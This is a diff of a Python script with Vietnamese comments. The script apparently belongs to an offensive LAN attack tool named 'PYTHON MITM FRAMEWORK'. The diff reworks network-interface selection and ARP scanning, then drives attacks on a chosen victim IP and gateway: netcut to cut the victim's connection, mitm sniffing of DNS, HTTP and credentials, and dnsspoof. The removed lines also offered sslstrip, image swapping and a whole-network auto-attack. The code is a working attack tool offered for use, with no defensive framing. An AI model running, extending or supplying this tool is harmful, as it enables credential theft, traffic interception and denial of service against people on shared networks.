@@ -181,58 +181,49 @@ class VendorDetector:
 
 # ==================== SCANNER ====================
 class Scanner:
-    """Quét thiết bị trong mạng LAN"""
-    
-    def __init__(self, iface):
-        self.iface = iface
+    def __init__(self, iface_name, iface_data=None):
+        self.iface = iface_name
         self.vendor_detector = VendorDetector()
         
-        try:
-            self.my_ip = ni.ifaddresses(iface)[ni.AF_INET][0]['addr']
-            self.net = '.'.join(self.my_ip.split('.')[:3] + ['0/24'])
-        except (ValueError, KeyError):
-            console.print("[red]❌ Không tìm thấy IP trên interface này![/red]")
+        # Nếu đã có data IP từ lúc chọn interface thì dùng luôn
+        if iface_data and 'ips' in iface_data and len(iface_data['ips']) > 0:
+             for ip in iface_data['ips']:
+                if ":" not in ip: # Lấy IPv4
+                    self.my_ip = ip
+                    break
+        else:
+            # Fallback: Thử lấy lại bằng Scapy
+            try:
+                from scapy.all import get_if_addr
+                self.my_ip = get_if_addr(iface_name)
+            except:
+                self.my_ip = "0.0.0.0"
+
+        # Nếu vẫn không tìm thấy IP
+        if self.my_ip == "0.0.0.0" or self.my_ip is None:
+            console.print(f"[bold red]❌ LỖI: Interface '{iface_name}' không có IP![/bold red]")
             sys.exit(1)
-    
+
+        self.net = '.'.join(self.my_ip.split('.')[:3] + ['0/24'])
+        console.print(f"[green]✅ IP Của Máy: {self.my_ip} (Mạng: {self.net})[/green]")
+
     def scan(self):
-        """Quét mạng và trả về danh sách thiết bị"""
         console.print(f"[yellow]🔍 Đang quét mạng {self.net} trên {self.iface}...[/yellow]")
-        
         try:
+            # Timeout 3s để quét kỹ hơn
             ans, _ = arping(self.net, iface=self.iface, verbose=0, timeout=3)
         except Exception as e:
-            console.print(f"[red]❌ Lỗi quét mạng: {e}[/red]")
+            console.print(f"[red]❌ Lỗi quét ARP: {e}[/red]")
             return []
         
         devices = []
         for sent, recv in ans:
             mac = recv.hwsrc
             vendor = self.vendor_detector.get_vendor(mac)
-            devices.append({
-                'ip': recv.psrc,
-                'mac': mac,
-                'vendor': vendor
-            })
+            devices.append({'ip': recv.psrc, 'mac': mac, 'vendor': vendor})
         
         console.print(f"[green]✅ Tìm thấy {len(devices)} thiết bị[/green]")
         return devices
-
-    def scan_ipv6(self):
-        """Quét mạng IPv6 bằng cách gửi Multicast Ping"""
-        console.print(f"[yellow]🔍 Đang quét IPv6 trên {self.iface}... (Mất khoảng 2-3s)[/yellow]")
-        ans, unans = sniff(iface=self.iface, timeout=3, 
-                           filter="icmp6 and ip6[40] == 129",
-                           count=10)
-        
-        devices_v6 = []
-        for pkt in ans:
-            if IPv6 in pkt:
-                ip6 = pkt[IPv6].src
-                mac = pkt[Ether].src
-                if ip6.startswith("fe80"):
-                    devices_v6.append({'ip': ip6, 'mac': mac})
-                    
-        return devices_v6
 
 # ==================== LIVE DASHBOARD ====================
 class LiveDashboard:
@@ -950,142 +941,83 @@ def print_devices(devices):
     console.print(table)
 
 def select_interface():
-    """Chọn network interface"""
-    console.print("\n[bold cyan]📡 Danh sách Network Interfaces:[/bold cyan]")
-    
-    interfaces = ni.interfaces()
+    console.print("\n[bold cyan]📡 Chọn Interface (Tìm dòng có IP 192.168.100.9):[/bold cyan]")
     
     if platform.system() == "Windows":
-        # Windows: Hiển thị description dễ hiểu
-        win_interfaces = get_windows_if_list()
-        table = Table()
-        table.add_column("ID", style="cyan")
-        table.add_column("Name", style="yellow")
-        table.add_column("Description", style="green")
+        interfaces = get_windows_if_list()
+        valid_choices = []
         
-        for idx, iface in enumerate(win_interfaces, 1):
-            table.add_row(str(idx), iface['name'], iface['description'])
-        
-        console.print(table)
-        
-        choice = Prompt.ask("Chọn interface (nhập số)", choices=[str(i) for i in range(1, len(win_interfaces)+1)])
-        return win_interfaces[int(choice)-1]['name']
-    else:
-        # Linux/Mac: Hiển thị tên interface
-        table = Table()
-        table.add_column("ID", style="cyan")
-        table.add_column("Interface", style="yellow")
-        
-        valid_interfaces = []
-        for idx, iface in enumerate(interfaces, 1):
-            try:
-                # Check if interface has IP
-                addrs = ni.ifaddresses(iface)
-                if ni.AF_INET in addrs:
-                    table.add_row(str(idx), iface)
-                    valid_interfaces.append(iface)
-            except:
-                pass
-        
-        console.print(table)
-        
-        choice = Prompt.ask("Chọn interface (nhập số)", choices=[str(i) for i in range(1, len(valid_interfaces)+1)])
-        return valid_interfaces[int(choice)-1]
+        # Tạo bảng đẹp
+        table = Table(show_header=True, header_style="bold magenta")
+        table.add_column("No.", style="dim", width=4)
+        table.add_column("Name", style="cyan")
+        table.add_column("IP Address", style="green", justify="center")
+        table.add_column("Description", style="white")
 
-# ==================== MAIN ====================
-def main():
-    """Main function"""
-    try:
-        # Check privileges
-        check_privileges()
-        
-        # Print banner
-        print_banner()
-        
-        # Select interface
-        iface = select_interface()
-        console.print(f"\n[green]✅ Đã chọn interface: {iface}[/green]")
-        
-        # Scan network
-        scanner = Scanner(iface)
-        devices = scanner.scan()
-        
-        if not devices:
-            console.print("[red]❌ Không tìm thấy thiết bị nào![/red]")
-            sys.exit()
-        
-        print_devices(devices)
-        
-        # Choose mode
-        console.print("\n[bold yellow]🎯 Chọn chế độ tấn công:[/bold yellow]")
-        console.print("[1] Single Target - Tấn công 1 mục tiêu")
-        console.print("[2] Auto Attack - Tấn công toàn bộ mạng")
-        
-        attack_mode = Prompt.ask("Chọn chế độ", choices=["1", "2"], default="1")
-        
-        if attack_mode == "2":
-            # Auto attack mode
-            console.print("\n[bold]⚙️  Cấu hình Auto Attack:[/bold]")
-            mode = Prompt.ask(
-                "Chọn phương thức",
-                choices=["netcut", "mitm", "sslstrip"],
-                default="netcut"
-            )
+        idx_counter = 1
+        for i in interfaces:
+            # Chỉ hiện những cái có IP hoặc là card thật
+            ip_display = ""
+            if 'ips' in i and len(i['ips']) > 0:
+                # Lọc lấy IPv4
+                ipv4s = [x for x in i['ips'] if ":" not in x]
+                if ipv4s:
+                    ip_display = ipv4s[0]
             
-            auto = AutoAttacker(iface)
-            auto.start(mode)
-            
-            console.print("\n[bold red]⚔️  Đang chạy... Nhấn Enter để dừng.[/bold red]")
-            input()
-            auto.stop()
+            # Chỉ hiện những interface có IP hoặc tên Wi-Fi/Ethernet để đỡ rối
+            if ip_display or "Wi-Fi" in i['name'] or "Ethernet" in i['name']:
+                table.add_row(str(idx_counter), i['name'], ip_display, i['description'])
+                valid_choices.append(i)
+                idx_counter += 1
         
-        else:
-            # Single target mode
-            console.print("\n[bold]⚙️  Cấu hình Single Target:[/bold]")
-            
-            victim_ip = Prompt.ask(
-                "Nhập IP nạn nhân",
-                choices=[d['ip'] for d in devices]
-            )
-            
-            default_gateway = scanner.net.replace('0/24', '1')
-            gateway_ip = Prompt.ask("Nhập IP Gateway", default=default_gateway)
-            
-            console.print("\n[bold yellow]🎯 Chọn phương thức tấn công:[/bold yellow]")
-            console.print("[cyan]netcut[/cyan]    - Cắt kết nối mạng hoàn toàn")
-            console.print("[cyan]mitm[/cyan]      - Nghe lén traffic (DNS, HTTP, Credentials)")
-            console.print("[cyan]sslstrip[/cyan]  - Hạ cấp HTTPS xuống HTTP")
-            console.print("[cyan]imageswap[/cyan] - Thay thế hình ảnh bằng ảnh troll")
-            console.print("[cyan]dnsspoof[/cyan]  - Giả mạo DNS, chuyển hướng website")
-            
-            mode = Prompt.ask(
-                "Chọn phương thức",
-                choices=["netcut", "mitm", "sslstrip", "imageswap", "dnsspoof"],
-                default="netcut"
-            )
-            
-            # Start attack
-            attacker = Attacker(victim_ip, gateway_ip, iface)
-            attacker.start(mode)
-            
-            console.print("\n[bold red]⚔️  Đang chạy... Nhấn Ctrl+C để dừng.[/bold red]")
-            
-            while True:
-                time.sleep(1)
-    
-    except KeyboardInterrupt:
-        console.print("\n[yellow]⚠️  Phát hiện Ctrl+C...[/yellow]")
-        if 'attacker' in locals():
-            attacker.stop()
-        elif 'auto' in locals():
-            auto.stop()
-        sys.exit(0)
-    
-    except Exception as e:
-        console.print(f"\n[red]❌ Lỗi nghiêm trọng: {e}[/red]")
-        import traceback
-        traceback.print_exc()
-        sys.exit(1)
+        console.print(table)
+        
+        choice = Prompt.ask("Nhập số thứ tự", choices=[str(i) for i in range(1, len(valid_choices)+1)])
+        selected = valid_choices[int(choice)-1]
+        return selected['name'], selected # Trả về cả tên và data
+        
+    else:
+        # Linux (Giữ nguyên)
+        interfaces = ni.interfaces()
+        valid = [i for i in interfaces if ni.AF_INET in ni.ifaddresses(i)]
+        for idx, i in enumerate(valid, 1): print(f"{idx}. {i}")
+        choice = Prompt.ask("Chọn số", choices=[str(i) for i in range(1, len(valid)+1)])
+        return valid[int(choice)-1], None
 
 if __name__ == "__main__":
-    main()
+    try:
+        check_privileges()
+        console.rule("[bold red]PYTHON MITM FRAMEWORK[/bold red]")
+        
+        # Chọn interface và truyền data vào scanner
+        iface_name, iface_data = select_interface()
+        
+        scanner = Scanner(iface_name, iface_data)
+        devices = scanner.scan()
+        
+        if not devices: sys.exit()
+        
+        # Print table
+        table = Table(title="Devices Found")
+        table.add_column("IP"); table.add_column("MAC"); table.add_column("Vendor")
+        for d in devices: table.add_row(d['ip'], d['mac'], d['vendor'])
+        console.print(table)
+        
+        victim_ip = Prompt.ask("Nhập IP Nạn nhân", choices=[d['ip'] for d in devices])
+        # Tự động đoán gateway là .1 của dải mạng hiện tại
+        gateway_ip = Prompt.ask("Nhập IP Gateway", default=scanner.net.replace('0/24', '1'))
+        
+        mode = Prompt.ask("Chế độ", choices=["netcut", "mitm", "dnsspoof"], default="netcut")
+        
+        attacker = Attacker(victim_ip, gateway_ip, iface_name)
+        attacker.start(mode)
+        
+        while True: time.sleep(1)
+
+    except KeyboardInterrupt:
+        if 'attacker' in locals(): attacker.stop()
+        sys.exit()
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/red]")
+        import traceback
+        traceback.print_exc()
